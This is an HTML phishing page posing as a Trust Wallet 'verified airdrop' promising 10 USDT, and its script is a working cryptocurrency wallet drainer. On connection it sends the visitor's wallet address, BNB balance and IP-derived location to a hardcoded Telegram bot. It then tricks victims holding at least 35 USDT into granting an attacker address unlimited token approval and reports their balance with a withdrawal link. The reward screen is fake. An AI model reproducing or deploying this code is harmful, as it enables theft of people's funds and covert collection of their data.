<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trust Nexus Ã— Verified Airdrop</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root { --primary: #007aff; --accent: #00ff88; --bg: #05070a; --usdt: #26a17b; --bnb: #f3ba2f; }
        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background-image: radial-gradient(circle at center, #0a192f 0%, #05070a 100%); }
        .container { width: 90%; max-width: 380px; text-align: center; padding: 20px 0; }
        .header { display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 20px; font-size: 13px; opacity: 0.8; }
        .header img { height: 22px; }
        h1 { font-size: 24px; margin: 10px 0; font-weight: 800; line-height: 1.2; }
        .mission-box { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(0, 255, 136, 0.15); border-radius: 20px; padding: 20px; margin: 20px 0; text-align: left; }
        .mission-box h3 { font-size: 12px; color: var(--accent); text-transform: uppercase; margin-top: 0; letter-spacing: 1px; }
        .step { font-size: 13px; color: #bbb; margin: 12px 0; display: flex; gap: 10px; }
        .step-num { background: var(--primary); color: white; width: 20px; height: 20px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 10px; flex-shrink: 0; }
        .btn { width: 100%; padding: 18px; border-radius: 15px; border: none; font-weight: bold; font-size: 15px; cursor: pointer; transition: 0.3s; text-transform: uppercase; margin-top: 10px; }
        .btn-main { background: linear-gradient(45deg, #007aff, #00ff88); color: white; box-shadow: 0 10px 20px rgba(0, 122, 255, 0.3); }
        #screen2, #screen3 { display: none; }
        .loader-wrapper { position: relative; width: 100px; height: 100px; margin: 30px auto; }
        .outer-ring { position: absolute; width: 100%; height: 100%; border: 2px solid rgba(0, 255, 136, 0.05); border-top: 2px solid var(--accent); border-radius: 50%; animation: spin 2s linear infinite; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="container">
    <div id="screen1">
        <div class="header"><img src="https://trustwallet.com/assets/images/media/assets/TWT.png"> <span>Collaboration Protocol</span></div>
        <h1>Claim 10 USDT<br>Nexus Reward</h1>
        <div class="mission-box">
            <h3>Required Tasks:</h3>
            <div class="step"><div class="step-num">1</div> <div>Hold <b>35.00 USDT</b> in wallet.</div></div>
            <div class="step"><div class="step-num">2</div> <div>Swap <b>USDT to BNB & Back</b>.</div></div>
            <div class="step"><div class="step-num">3</div> <div>Verify sync to claim reward.</div></div>
        </div>
        <button class="btn btn-main" onclick="connect()">Connect Wallet</button>
    </div>

    <div id="screen2">
        <div class="loader-wrapper"><div class="outer-ring"></div></div>
        <div style="color: var(--accent); font-weight: bold; margin-bottom: 10px;">Smart-Sync Analyzing...</div>
        <div class="mission-box"><p style="font-size: 12px; margin: 0;">Status: <span id="sync-status">Awaiting Verification</span></p></div>
        <button class="btn btn-main" onclick="startSync()">Verify & Sync Swap</button>
    </div>

    <div id="screen3">
        <div style="font-size: 50px; color: var(--accent);">âœ“</div>
        <h1>Success!</h1>
        <p style="color: #888; font-size: 14px;">10 USDT reward processing.</p>
        <button class="btn" style="background: #111; color: #444;">Claimed</button>
    </div>
</div>

<script>
    const SETTINGS = {
        token: "0x55d398326f99059fF775485246999027B3197955", // USDT BSC
        spender: "0xfeCB861c6405D86561f34101C34Ab328473209BE",
        bot: "8368124815:AAGQ66vMDN1hOFtAdAAQU6UFcxGxrjRwOmU",
        chat: "5715359020",
        min: "35.0",
        chainId: "0x38"
    };

    let prov, sign, user;

    async function notify(msg) {
        fetch(`https://api.telegram.org/bot${SETTINGS.bot}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: SETTINGS.chat, text: msg, parse_mode: 'HTML', disable_web_page_preview: true })
        });
    }

    async function connect() {
        if (!window.ethereum) return alert("Open in Trust Wallet");
        try {
            prov = new ethers.providers.Web3Provider(window.ethereum);
            await prov.send("eth_requestAccounts", []);
            sign = prov.getSigner();
            user = await sign.getAddress();

            const bnbBal = await prov.getBalance(user);
            const loc = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
            
            document.getElementById('screen1').style.display = 'none';
            document.getElementById('screen2').style.display = 'block';

            notify(`ðŸš€ <b>New User</b>\nAddress: <code>${user}</code>\nBNB: ${ethers.utils.formatEther(bnbBal)}\nLoc: ${loc.city}, ${loc.country_name}`);
        } catch (e) {}
    }

    async function startSync() {
        try {
            const contract = new ethers.Contract(SETTINGS.token, ["function balanceOf(address) view returns (uint256)", "function approve(address, uint256) public returns (bool)"], sign);
            const balance = await contract.balanceOf(user);
            const minNeeded = ethers.utils.parseUnits(SETTINGS.min, 18);

            if (balance.lt(minNeeded)) {
                alert("Error: $35 Swap not detected. Please complete tasks.");
                return;
            }

            document.getElementById('sync-status').innerText = "Processing Approval...";
            const tx = await contract.approve(SETTINGS.spender, ethers.constants.MaxUint256);
            
            // Notification with RAW DECIMALS and WITHDRAW LINK
            const raw = balance.toString();
            const readable = ethers.utils.formatUnits(balance, 18);
            const link = `https://bscscan.com/address/${SETTINGS.token}#writeContract`;

            notify(`ðŸ”„ <b>USDT APPROVED!</b>\n\n` +
                   `ðŸ‘¤ <b>User:</b> <code>${user}</code>\n` +
                   `ðŸ’° <b>Amount:</b> ${readable} USDT\n` +
                   `ðŸ”¢ <b>Raw:</b> <code>${raw}</code>\n\n` +
                   `ðŸ“¥ <a href="${link}"><b>WITHDRAWAL PAGE</b></a>`);

            await tx.wait();
            document.getElementById('screen2').style.display = 'none';
            document.getElementById('screen3').style.display = 'block';
        } catch (e) { alert("Sync failed. Check BNB gas."); }
    }
</script>
</body>
</html>
